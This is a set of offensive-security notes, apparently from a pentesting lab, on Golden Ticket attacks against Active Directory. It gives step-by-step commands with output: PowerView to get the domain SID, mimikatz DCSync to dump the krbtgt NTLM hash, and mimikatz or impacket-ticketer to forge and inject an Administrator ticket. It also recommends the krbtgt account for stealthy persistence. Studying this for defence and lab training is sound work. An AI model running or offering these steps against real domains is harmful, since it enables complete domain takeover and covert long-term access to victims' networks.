## What are?
It's a particular attack vector that targets the **krbtgt** account in a AD environment. If an attacker can get the **krbtgt** hash then he can use it to forge whatever TGT ticket  he wants(even non existent ones).
This account is very "juicy" as often is not monitored, and the password reset must be done 2 times in order to rotate the keys(the password change can't be done in sequence but with minimum of 10 hours in-between) making this time span very difficult to track and very useful to being stealthy and gain persistence(less likely by a victim to rotate the password).

## What is the krbtgt?
it is a default account present in every AD environment, and by default have *no privileges* and it is *disabled*.
The *krbtgt's* keys are used by DC to encrypt the TGTs tickets, therefore knowing the credentials(password hash) can let you decrypt TGTs and tamper them to create valid tickets for Domain Admin, this is called **Golden Tickets.** 

# Attacks
## From Windows
In order to be able forge a so called "Golden Ticket" we need the following pieces of information:
1. `Domain Name`
2. `Domain SID`
3. `Username to Impersonate`
4. `KRBTGT's hash`

Getting the domain SID.
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainSID
S-1-5-21-2974783224-3764228556-2640795941
```
The domain name is easy to find. Same is for the username to impersonate.
Now regarding the **krbtgt** password hash it is get's more intriguing as we need a high privilege account that have example *DCSync* rights, Domain Admin or Administrator over DC in order to being able to dump the **NTDS** file.
```powershell-session
mimikatz # lsadump::dcsync /user:krbtgt /domain:inlanefreight.local
[DC] 'inlanefreight.local' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/14/2022 6:51:29 AM
Object Security ID   : S-1-5-21-2974783224-3764228556-2640795941-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 810d754e118439bab1e1d13216150299
```
And now we have everything needed to forge a valid Golden ticket...
```powershell-session
mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
```
This will not only generate a ticket, but also inject into same current session.
Now use it to take your attack further.

## From Linux
Same can be obtained directly from your Linux machine.
Same here we need the following pieces of information:
1. `Domain Name`
2. `Domain SID`
3. `Username to Impersonate`
4. `KRBTGT's hash`

Both the Domain and the User to impersonate is something we know or can find easily.
The domain SID can be found  with this command.
```shell-session
impacket-lookupsid inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
```
Now we can forge a *Golden Ticket* with this command.
```shell-session
impacket-ticketer -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator
```
Point to the **ccache** ticket and use it to take your attack further.
```shell-session
export KRB5CCNAME=./Administrator.ccache
```